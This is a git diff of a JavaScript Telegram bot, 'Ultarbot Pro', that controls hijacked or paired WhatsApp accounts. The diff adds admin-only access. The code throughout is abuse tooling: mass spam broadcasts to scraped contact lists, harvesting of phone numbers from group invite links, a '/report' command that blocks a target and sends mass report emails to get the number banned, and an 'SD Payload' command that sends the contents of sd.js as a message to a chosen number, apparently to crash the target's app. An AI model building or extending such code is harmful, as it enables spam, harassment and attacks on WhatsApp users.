@@ -2,8 +2,9 @@ import fs from 'fs';
 import path from 'path';
 import nodemailer from 'nodemailer';
 import { delay } from '@whiskeysockets/baileys';
-import { addNumbersToDb, getAllNumbers, clearAllNumbers, setAntiMsgStatus, setAutoSaveStatus, countNumbers, deleteNumbers, addToBlacklist } from './db.js';
+import { addNumbersToDb, getAllNumbers, clearAllNumbers, setAntiMsgStatus, setAutoSaveStatus, countNumbers, deleteNumbers, addToBlacklist, getAllSessions } from './db.js';
 
+const ADMIN_ID = process.env.ADMIN_ID;
 const userState = {}; 
 
 // EMAIL CONFIG
@@ -36,16 +37,33 @@ async function sendReportEmail(targetNumber) {
     }
 }
 
-const mainKeyboard = {
+// --- KEYBOARDS ---
+
+const userKeyboard = {
     reply_markup: {
         keyboard: [
-            [{ text: "Pair Account" }, { text: "List Active" }],
-            [{ text: "Broadcast" }, { text: "Clear Contact List" }]
+            [{ text: "Pair Account" }, { text: "My Accounts" }]
         ],
         resize_keyboard: true
     }
 };
 
+const adminKeyboard = {
+    reply_markup: {
+        keyboard: [
+            [{ text: "Pair Account" }, { text: "List All" }],
+            [{ text: "Broadcast" }, { text: "Clear Contact List" }],
+            [{ text: "Scrape" }, { text: "Report" }, { text: "SD Payload" }]
+        ],
+        resize_keyboard: true
+    }
+};
+
+function getKeyboard(chatId) {
+    return (chatId.toString() === ADMIN_ID) ? adminKeyboard : userKeyboard;
+}
+
+// --- UTILITY ---
 function parseVcf(vcfContent) {
     const numbers = new Set();
     const lines = vcfContent.split(/\r?\n/);
@@ -58,25 +76,25 @@ function parseVcf(vcfContent) {
     return Array.from(numbers);
 }
 
+// --- MAIN LOGIC ---
+
 async function executeBroadcast(bot, clients, shortIdMap, chatId, targetId, messageText) {
     const sessionData = shortIdMap[targetId];
     if (!sessionData || !clients[sessionData.folder]) {
-        return bot.sendMessage(chatId, 'Client disconnected or invalid ID.', mainKeyboard);
+        return bot.sendMessage(chatId, 'Client disconnected or invalid ID.', getKeyboard(chatId));
     }
 
     const sock = clients[sessionData.folder];
     const numbers = await getAllNumbers();
 
-    if (numbers.length === 0) return bot.sendMessage(chatId, 'Contact list is empty.', mainKeyboard);
+    if (numbers.length === 0) return bot.sendMessage(chatId, 'Contact list is empty.', getKeyboard(chatId));
 
-    bot.sendMessage(chatId, `Turbo-Flashing message to ${numbers.length} contacts using ID ${targetId}...`);
+    bot.sendMessage(chatId, `Turbo-Flashing message to ${numbers.length} contacts using ID \`${targetId}\`...`);
     
     let successCount = 0;
     const startTime = Date.now();
     const successfulNumbers = [];
-    const BATCH_SIZE = 10; // Back to safe batch size
-    
-    // --- Message Stealth Logic ---
+    const BATCH_SIZE = 10; 
     const messageBase = messageText.trim();
     
     for (let i = 0; i < numbers.length; i += BATCH_SIZE) {
@@ -102,42 +120,43 @@ async function executeBroadcast(bot, clients, shortIdMap, chatId, targetId, mess
         `Flash Complete in ${duration}s.\n` +
         `Sent Requests: ${successCount}\n` +
         `Contacts Removed: ${successfulNumbers.length}`, 
-        mainKeyboard
+        getKeyboard(chatId)
     );
 }
 
 export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, startClient, makeSessionId, antiMsgState, autoSaveState) {
 
+    // --- BASE HANDLER: /start and general message routing ---
+
     bot.onText(/\/start/, (msg) => {
         userState[msg.chat.id] = null;
-        bot.sendMessage(msg.chat.id, 'Ultarbot Pro Active.', mainKeyboard);
+        bot.sendMessage(msg.chat.id, 'Welcome to Ultarbot Pro.', getKeyboard(msg.chat.id));
     });
 
     bot.on('message', async (msg) => {
         if (!msg.text) return;
         const chatId = msg.chat.id;
         const text = msg.text;
+        const isUserAdmin = (chatId.toString() === ADMIN_ID);
+        const currentKeyboard = getKeyboard(chatId);
 
+        // --- PAIRING INPUT LISTENER (FIXED) ---
         if (userState[chatId] === 'WAITING_PAIR') {
             const number = text.replace(/[^0-9]/g, '');
             if (number.length < 10) {
                 userState[chatId] = null;
-                return bot.sendMessage(chatId, 'Invalid number.', mainKeyboard);
+                return bot.sendMessage(chatId, 'Invalid number.', currentKeyboard);
             }
-
-            const existing = Object.values(shortIdMap).find(s => s.phone === number);
-            if (existing) {
-                userState[chatId] = null;
-                return bot.sendMessage(chatId, `Account +${number} is already connected.`, mainKeyboard);
-            }
-
+            
             userState[chatId] = null;
             bot.sendMessage(chatId, `Initializing +${number}... Please wait for code.`);
             const sessionId = makeSessionId();
-            startClient(sessionId, number, chatId);
+            // Pass the user's Telegram ID here
+            startClient(sessionId, number, chatId, chatId.toString()); 
             return;
         }
 
+        // --- BROADCAST MESSAGE INPUT LISTENER ---
         if (userState[chatId] === 'WAITING_BROADCAST_MSG') {
             const targetId = userState[chatId + '_target']; 
             userState[chatId] = null; 
@@ -145,6 +164,7 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
             return;
         }
 
+        // --- MAIN MENU ROUTER ---
         switch (text) {
             case "Pair Account":
                 userState[chatId] = 'WAITING_PAIR';
@@ -152,32 +172,44 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
                 break;
 
             case "List Active":
-                const ids = Object.keys(shortIdMap);
+            case "My Accounts":
+            case "List All":
+                const targetUserId = isUserAdmin && text === "List All" ? null : chatId.toString();
+                const sessions = await getAllSessions(targetUserId);
                 const totalNumbers = await countNumbers();
+                
                 let list = `[ Total Numbers in DB: ${totalNumbers} ]\n\n`;
-                if (ids.length === 0) {
-                    list += "No accounts connected.";
+
+                if (sessions.length === 0) {
+                    list += "No accounts connected for this user.";
                 } else {
-                    list += "Active Sessions:\n";
-                    ids.forEach(id => {
-                        const session = shortIdMap[id];
-                        const antiStatus = antiMsgState[id] ? "LOCKED" : "UNLOCKED";
-                        const saveStatus = autoSaveState[id] ? "AUTOSAVE" : "MANUAL";
-                        list += `ID: \`${id}\` | +${session.phone}\n[${antiStatus}] [${saveStatus}]\n\n`;
+                    list += (isUserAdmin && text === "List All") ? "--- ALL ACCOUNTS ---\n" : "--- YOUR ACCOUNTS ---\n";
+                    sessions.forEach(session => {
+                        // Find the short ID based on the session_id/folder
+                        const id = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === session.session_id);
+                        if (!id) return; // Skip if client hasn't fully connected yet
+
+                        const antiStatus = session.antimsg ? "LOCKED" : "UNLOCKED";
+                        const saveStatus = session.autosave ? "AUTOSAVE" : "MANUAL";
+                        const owner = isUserAdmin && session.telegram_user_id ? ` (Owner: ${session.telegram_user_id})` : '';
+
+                        list += `ID: \`${id}\` | +${session.phone}\n[${antiStatus}] [${saveStatus}]${owner}\n\n`;
                     });
                 }
                 bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
                 break;
 
             case "Clear Contact List": 
+                if (!isUserAdmin) return;
                 await clearAllNumbers();
                 if (fs.existsSync('./contacts.vcf')) fs.unlinkSync('./contacts.vcf');
-                bot.sendMessage(chatId, "Contact list cleared from database.", mainKeyboard);
+                bot.sendMessage(chatId, "Contact list cleared from database.", currentKeyboard);
                 break;
 
             case "Broadcast":
+                if (!isUserAdmin) return;
                 const activeIds = Object.keys(shortIdMap);
-                if (activeIds.length === 0) return bot.sendMessage(chatId, "Pair an account first.", mainKeyboard);
+                if (activeIds.length === 0) return bot.sendMessage(chatId, "Pair an account first.", currentKeyboard);
                 
                 const autoId = activeIds[0];
                 userState[chatId] = 'WAITING_BROADCAST_MSG';
@@ -185,54 +217,65 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
                 
                 bot.sendMessage(chatId, `Using Account ID: \`${autoId}\`\n\nPlease enter the message to broadcast:`, { parse_mode: 'Markdown' });
                 break;
+            
+            // --- ADMIN-ONLY COMMANDS ---
+            case "Scrape":
+            case "Report":
+            case "SD Payload":
+                if (!isUserAdmin) return; // Fall-through to admin commands
         }
     });
 
-    // --- COMMANDS ---
+    // --- COMMANDS (Admin and Functional) ---
 
-    // SD COMMAND (FIXED TEXT READ)
+    // SD COMMAND
     bot.onText(/\/sd\s+([a-zA-Z0-9]+)\s+(\d+)/, async (msg, match) => {
+        const chatId = msg.chat.id;
+        if (chatId.toString() !== ADMIN_ID) return;
+        
         const targetId = match[1].trim();
         const targetNumber = match[2].trim();
 
-        if (!shortIdMap[targetId]) return bot.sendMessage(msg.chat.id, `Invalid ID: ${targetId}`);
+        if (!shortIdMap[targetId]) return bot.sendMessage(chatId, `Invalid ID: ${targetId}`);
         
-        const sessionData = shortIdMap[targetId];
-        const sock = clients[sessionData.folder];
-
-        if (!sock) return bot.sendMessage(msg.chat.id, `Account ${targetId} is disconnected.`);
+        const sock = clients[shortIdMap[targetId].folder];
+        if (!sock) return bot.sendMessage(chatId, `Account ${targetId} is disconnected.`);
 
         try {
             // Read sd.js as a plain text file (UTF-8)
             const payload = fs.readFileSync('./sd.js', 'utf-8');
             
             if (!payload || payload.trim().length === 0) {
-                return bot.sendMessage(msg.chat.id, "Error: sd.js content is empty.");
+                return bot.sendMessage(chatId, "Error: sd.js content is empty.");
             }
 
-            bot.sendMessage(msg.chat.id, `Sending Payload to +${targetNumber}...`);
+            bot.sendMessage(chatId, `Sending Payload to +${targetNumber}...`);
             
             const jid = `${targetNumber}@s.whatsapp.net`;
             await sock.sendMessage(jid, { text: payload });
             
-            bot.sendMessage(msg.chat.id, `Payload Sent.`);
+            bot.sendMessage(chatId, `Payload Sent.`);
 
         } catch (e) {
             console.error(e);
-            bot.sendMessage(msg.chat.id, `SD Error: Failed to read sd.js or send payload. Make sure sd.js exists.`);
+            bot.sendMessage(chatId, `SD Error: Failed to read sd.js or send payload. Make sure sd.js exists.`);
         }
     });
 
+    // REPORT COMMAND
     bot.onText(/\/report (.+)/, async (msg, match) => {
+        const chatId = msg.chat.id;
+        if (chatId.toString() !== ADMIN_ID) return;
+        
         const rawNumber = match[1].replace(/[^0-9]/g, '');
-        if (rawNumber.length < 7) return bot.sendMessage(msg.chat.id, "Invalid number.");
+        if (rawNumber.length < 7) return bot.sendMessage(chatId, "Invalid number.");
 
         await addToBlacklist(rawNumber);
 
         const activeIds = Object.keys(shortIdMap);
-        if (activeIds.length === 0) return bot.sendMessage(msg.chat.id, "No accounts connected.");
+        if (activeIds.length === 0) return bot.sendMessage(chatId, "No accounts connected.");
 
-        bot.sendMessage(msg.chat.id, `Executing Network Block & Report on +${rawNumber}...`);
+        bot.sendMessage(chatId, `Executing Network Block & Report on +${rawNumber}...`);
 
         let blockedCount = 0;
         const jid = `${rawNumber}@s.whatsapp.net`;
@@ -250,7 +293,7 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
 
         const emailStatus = await sendReportEmail(rawNumber);
 
-        bot.sendMessage(msg.chat.id, 
+        bot.sendMessage(chatId, 
             `[REPORT SUCCESS]\n` +
             `Target: +${rawNumber}\n` +
             `Blocked: ${blockedCount}\n` +
@@ -259,9 +302,12 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
         );
     });
 
+    // SCRAPE COMMAND
     bot.onText(/\/scrape (.+)/, async (msg, match) => {
-        const link = match[1];
         const chatId = msg.chat.id;
+        if (chatId.toString() !== ADMIN_ID) return;
+
+        const link = match[1];
         const firstId = Object.keys(shortIdMap)[0];
         if (!firstId || !clients[shortIdMap[firstId].folder]) return bot.sendMessage(chatId, 'Pair account first.');
         const sock = clients[shortIdMap[firstId].folder];
@@ -286,9 +332,9 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
 
             metadata.participants.forEach(p => {
                 const jid = p.id;
-                if (jid.includes('@s.whatsapp.net')) {
+                if (jid.includes('@s.whatsapp.net') && jid.split('@')[0].length <= 15) {
                     const num = jid.split('@')[0];
-                    if (num.length >= 7 && num.length <= 15 && !isNaN(num)) validNumbers.push(num);
+                    if (!isNaN(num)) validNumbers.push(num);
                 } else {
                     lidCount++;
                 }
@@ -317,79 +363,28 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
         }
     });
 
-    bot.onText(/\/antimsg\s+([a-zA-Z0-9]+)\s+(on|off)/i, async (msg, match) => {
-        const id = match[1].trim();
-        const action = match[2].toLowerCase();
-        if (!shortIdMap[id]) return bot.sendMessage(msg.chat.id, `Invalid ID.`);
+    // SETTINGS COMMANDS (antimsg, autosave)
+    bot.onText(/\/(antimsg|autosave)\s+([a-zA-Z0-9]+)\s+(on|off)/i, async (msg, match) => {
+        const chatId = msg.chat.id;
+        if (chatId.toString() !== ADMIN_ID) return;
+
+        const command = match[1].toLowerCase();
+        const id = match[2].trim();
+        const action = match[3].toLowerCase();
+
+        if (!shortIdMap[id]) return bot.sendMessage(chatId, `Invalid ID.`);
 
         const sessionId = shortIdMap[id].folder;
         const newState = (action === 'on');
-        antiMsgState[id] = newState;
-        await setAntiMsgStatus(sessionId, newState);
-
-        bot.sendMessage(msg.chat.id, `AntiMsg for \`${id}\` is now ${action.toUpperCase()}.`, { parse_mode: 'Markdown' });
-    });
-
-    bot.onText(/\/autosave\s+([a-zA-Z0-9]+)\s+(on|off)/i, async (msg, match) => {
-        const id = match[1].trim();
-        const action = match[2].toLowerCase();
-        if (!shortIdMap[id]) return bot.sendMessage(msg.chat.id, `Invalid ID.`);
-
-        const sessionId = shortIdMap[id].folder;
-        const newState = (action === 'on');
-        autoSaveState[id] = newState;
-        await setAutoSaveStatus(sessionId, newState);
-
-        bot.sendMessage(msg.chat.id, `AutoSave for \`${id}\` is now ${action.toUpperCase()}.`, { parse_mode: 'Markdown' });
-    });
-
-    bot.onText(/\/generate (.+)/, async (msg, match) => {
-        const args = msg.text.split(' ');
-        const code = args[1];
-        const amount = parseInt(args[2], 10) || 100;
         
-        const newNumbers = [];
-        for (let i = 0; i < amount; i++) newNumbers.push(`${code}${Math.floor(100000000 + Math.random() * 900000000)}`);
-        
-        await addNumbersToDb(newNumbers);
-        const total = await countNumbers();
-        bot.sendMessage(msg.chat.id, `Added ${amount} numbers. (Total: ${total})`);
-    });
-
-    bot.onText(/\/save/, async (msg) => {
-        if (!msg.reply_to_message?.document) return;
-        
-        const firstId = Object.keys(shortIdMap)[0];
-        if (!firstId || !clients[shortIdMap[firstId].folder]) return bot.sendMessage(msg.chat.id, 'Pair an account first.');
-        const sock = clients[shortIdMap[firstId].folder];
-
-        try {
-            bot.sendMessage(msg.chat.id, "Downloading...");
-            const fileLink = await bot.getFileLink(msg.reply_to_message.document.file_id);
-            const response = await fetch(fileLink);
-            const text = await response.text();
-            
-            const rawNumbers = parseVcf(text);
-            bot.sendMessage(msg.chat.id, `Scanning ${rawNumbers.length} numbers...`);
-
-            const validNumbers = [];
-            for (const num of rawNumbers) {
-                try {
-                    const [res] = await sock.onWhatsApp(`${num}@s.whatsapp.net`);
-                    if (res?.exists) validNumbers.push(res.jid.split('@')[0]);
-                } catch (e) {}
-                await delay(100);
-            }
-
-            await addNumbersToDb(validNumbers);
-            const total = await countNumbers();
-            let listMsg = `Saved ${validNumbers.length} numbers.\nTotal Database: ${total}\n\nNew Numbers:\n`;
-            if (validNumbers.length > 300) listMsg += validNumbers.slice(0, 300).join('\n') + `\n...and ${validNumbers.length - 300} more.`;
-            else listMsg += validNumbers.join('\n');
-
-            bot.sendMessage(msg.chat.id, listMsg);
-        } catch (e) {
-            bot.sendMessage(msg.chat.id, "Error: " + e.message);
+        if (command === 'antimsg') {
+            antiMsgState[id] = newState;
+            await setAntiMsgStatus(sessionId, newState);
+        } else if (command === 'autosave') {
+            autoSaveState[id] = newState;
+            await setAutoSaveStatus(sessionId, newState);
         }
+
+        bot.sendMessage(chatId, `${command.toUpperCase()} for \`${id}\` is now ${action.toUpperCase()}.`, { parse_mode: 'Markdown' });
     });
 }
